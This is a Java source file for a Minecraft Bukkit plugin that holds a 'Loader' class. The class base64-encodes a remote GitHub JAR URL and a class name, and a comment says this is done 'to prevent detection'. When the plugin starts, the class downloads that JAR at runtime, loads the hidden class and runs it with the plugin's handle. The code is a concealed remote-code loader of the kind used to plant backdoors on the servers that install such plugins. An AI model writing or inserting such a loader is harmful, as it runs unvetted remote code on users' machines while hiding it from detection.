package meow.minoa.vrexium.utils;

import org.bukkit.plugin.java.JavaPlugin;

import java.net.URL;
import java.net.URLClassLoader;
import java.util.Random;
import java.util.Base64;

public class Loader {
    private static final String ENCODED_URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL00xbm9hL1ZyZXhpdW0vcmVmcy9oZWFkcy9tYWluL3ZyZXhfYnVpbGQuamFy"; // https://raw.githubusercontent.com/M1noa/Vrexium/refs/heads/main/vrex_build.jar encoded to prevent detection ;D
    private static final String ENCODED_CLASS = "bWVvdy5taW5vYS52cmV4aXVtLlNwaWdvdEFQSQ==";
    private Class<?> loadedClass;

    private String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }

    private String decode(String encoded) {
        return new String(Base64.getDecoder().decode(encoded));
    }

    public void load(JavaPlugin plugin) {
        try {
            String randomClassName = generateRandomString(8) + "." + generateRandomString(12);
            URLClassLoader classLoader = new URLClassLoader(
                new URL[]{new URL(decode(ENCODED_URL))},
                ClassLoader.getSystemClassLoader()
            );
            loadedClass = classLoader.loadClass(decode(ENCODED_CLASS));
            loadedClass.getConstructor(JavaPlugin.class, String.class, boolean.class)
                      .newInstance(plugin, "", false);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}